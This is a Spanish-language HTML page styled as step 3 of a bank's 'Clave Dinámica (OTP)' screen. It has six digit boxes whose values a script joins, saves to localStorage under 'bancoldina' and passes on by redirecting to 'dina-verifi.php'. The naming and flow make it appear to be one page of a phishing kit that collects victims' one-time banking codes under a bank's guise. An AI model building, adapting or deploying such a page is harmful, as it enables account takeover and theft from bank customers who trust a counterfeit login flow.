<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Clave Dinámica</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: Arial, sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .steps {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }

    .step-circle {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background-color: #0053ba;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      font-weight: bold;
    }

    .line {
      flex: 1;
      height: 2px;
      background-color: #ccc;
      margin: 0 8px;
    }

    .dot {
      width: 12px;
      height: 12px;
      background-color: #ccc;
      border-radius: 50%;
    }

    h2 {
      font-size: 20px;
      margin-bottom: 25px;
    }

    .otp-inputs {
      display: flex;
      justify-content: space-between;
      gap: 8px;
      margin-bottom: 25px;
    }

    .otp-inputs input {
      width: 40px;
      height: 50px;
      text-align: center;
      font-size: 18px;
      border: 1px solid #ccc;
      border-radius: 6px;
      background-color: #f2f2f2;
    }

    .btn {
      width: 100%;
      padding: 16px;
      font-size: 16px;
      font-weight: bold;
      background-color: #ccc;
      color: #444;
      border: none;
      border-radius: 30px;
      cursor: not-allowed;
    }

    .btn.enabled {
      background-color: #0053ba;
      color: #fff;
      cursor: pointer;
    }

    .footer-link {
      text-align: center;
      font-size: 14px;
      margin-top: 25px;
    }

    .footer-link a {
      color: #0053ba;
      text-decoration: none;
    }
  </style>
</head>
<body>

<div class="container">
  <!-- PASOS -->
  <div class="steps">
    <div class="step-circle">3</div>
    <div class="line"></div>
    <div class="dot"></div>
    <div class="line"></div>
    <div class="dot"></div>
  </div>

  <h2>Clave Dinámica (OTP)</h2>

  <form id="otpForm">
    <div class="otp-inputs">
      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
      <input type="tel" maxlength="1" pattern="[0-9]*" class="otp" />
    </div>

    <button type="submit" class="btn" id="continuarBtn" disabled>Continuar</button>
  </form>

  <div class="footer-link">
    <a href="#">En otro momento</a>
  </div>
</div>

<script>
  const inputs = document.querySelectorAll(".otp");
  const continuarBtn = document.getElementById("continuarBtn");

  inputs.forEach((input, index) => {
    input.addEventListener("input", (e) => {
      if (!/^\d$/.test(e.target.value)) {
        e.target.value = "";
      } else if (index < inputs.length - 1) {
        inputs[index + 1].focus();
      }

      validar();
    });

    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && index > 0 && !input.value) {
        inputs[index - 1].focus();
      }
    });
  });

  function validar() {
    const filled = Array.from(inputs).every(input => input.value);
    continuarBtn.disabled = !filled;
    continuarBtn.classList.toggle("enabled", filled);
  }

  document.getElementById("otpForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const codigo = Array.from(inputs).map(input => input.value).join("");
    localStorage.setItem("bancoldina", codigo);
    window.location.href = "dina-verifi.php";
  });
</script>

</body>
</html>
